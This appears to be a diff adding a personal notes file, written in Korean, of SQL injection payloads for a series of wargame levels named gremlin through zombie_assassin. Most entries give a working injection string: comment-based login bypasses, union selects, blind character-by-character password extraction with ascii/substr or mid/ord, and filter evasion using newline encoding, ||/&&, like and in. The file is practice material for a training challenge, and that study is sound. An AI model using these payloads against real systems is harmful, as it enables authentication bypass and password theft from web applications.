@@ -1,0 +1,63 @@
+gremlin
+id만 넣고 주석처리
+id=a%27%20or%201--+
+
+cobolt
+id만넣고 주석처리
+id=admin%27--+
+
+goblin
+union select [함수] 를 이용해서 글자 만듬
+no=0%20union%20select%20concat(char(97)%20,char(100),%20char(109),%20char(105),%20char(110))
+
+orc
+아이디 admin확인
+패스워드 길이확인
+mysql에서는 대소문자 비교가 정확하지않음
+하지만 리턴된 php에서는 정확하게 비교함 그래서 정확한 값을 비교하기위해서 아스키값으로 비교
+pw=1'or id='admin' and ascii(substr(pw, 1, 1)) = 41 --+
+한글자씩 추출
+
+wolfman
+유니온, %0a로 공백 #으로 주석
+pw=0%27%0a%0aunion%0aselect%0a%27admin%27%0a%23	
+
+darkelf
+울프보다 더쉬움 유니온으로 가져오면됨
+pw=1%27union%20select%20(%27admin%27)--+
+
+orge
+and or 대신 || && 사용 잘안들어가면 헥스값으로
+pw=1' %7c%7c id='admin' %26%26 ascii(substr(pw,1,1))=41--+
+
+troll
+id=Admin
+
+vampire
+id=adadminmin
+
+skeleton
+pw=1%27%20union%20select%20%27admin%27--+
+
+golem
+and or 는 위랑 같이 피하고 = 안되는건 like으로 비교
+pw=1'%7c%7c id like 'admin' %26%26 ascii(substring(pw,1,1))>41 --+
+
+darkknight
+우선 no에서는 쿼터 안넣어도 바로 탈출되닌까 pw말고 no사용
+and or는 위와 같이 피하고 like도 위에껄로 피함
+ascii랑 substr대신 ord 랑 mid 사용
+
+bugbear
+공백 0a로처리 or and연산 헥스값으로처리 같다는표시도 in으로 처리
+pw=1&no=1%7c%7c%0a%0aid%0ain%0a("admin")%26%26mid(pw,1,1)%0ain("A")
+
+giant
+shit=%0c
+쉬프트피드 문자 찾아서 아무거나 넣으면 됨
+
+assassin
+pw=832%
+
+zombie_assassin
+id=admin&pw=%00%27%20or%201--+
